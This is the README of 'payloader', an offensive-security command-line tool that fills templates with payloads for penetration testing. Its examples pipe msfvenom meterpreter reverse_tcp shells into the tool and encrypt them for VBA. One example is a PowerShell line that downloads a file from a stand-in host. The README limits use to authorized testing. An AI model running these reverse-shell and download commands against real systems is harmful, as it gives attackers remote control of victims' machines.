# payloader

Generate payloads using a a simple cli interface for faster access to custom payloads.

payloader allow you to automate a whole lot of copy paste work to speed up that workflow inthe shell.

Inputs are substituted into custom templates and automate builds where possible. 

## Features

- Lightweight
- Cusom templates
- Payloads can be piped in and directly set.

Eg.

```
msfvenon -p windows/x64/meterpreter/reverse_tcp LPORT=443 LHOST=10.10.10.10 -f ps1 | payloader example.ps1 -f ps1 -o test
```

or

```bash
payloader example.ps1 -f ps1 -o test -p "iwr http://test.com/test -o test"
```

## Custom Encryption 

```bash
msfvenon -p windows/x64/meterpreter/reverse_tcp LPORT=443 LHOST=10.10.10.10 -f ps1 | payloader_encrypt --encryption ff --key 5 --lang vba< | payloader -f vba -o test
```


# Install

```bash
git clone https://github.com/desterhuizen/payloader.git
cd payloader
virtualenv .venv
ln -s $(realpath ./payloader.py) ~/.local/bin/payloader
ln -s $(realpath ./payloader_encrypt.py) ~/.local/bin/payloader_encrypt
ln -s $(realpath ./payloader_decrypt.py) ~/.local/bin/payloader_decrypt
git submodule add <YOUR PAYLOADS REPO> templates
git submodule init
```


## License

payloader is licensed under the **GNU Affero General Public License v3.0
or later (AGPL-3.0-or-later)**. See [`LICENSE`](LICENSE) for the full
text.

Because payloader is AGPL, anyone who runs a modified version of
payloader as a network-accessible service must make the corresponding
source code of that modified version available to the users of that
service.

### Acceptable use — no malicious use

payloader is an offensive-security tool intended solely for
**authorized** penetration testing, CTFs, training labs, security
research, and education on systems you own or have explicit written
permission to test. See [`NOTICE`](NOTICE) for the full acceptable-use
statement.

**You must not** use payloader — or any output it produces — to access,
disrupt, or compromise any system, network, account, or data without the
prior, explicit, written authorization of its lawful owner, or to
violate any applicable law. Unauthorized computer access is a criminal
offense in most jurisdictions. By using payloader you represent that
your activity is authorized and lawful; the authors accept no liability
for misuse.

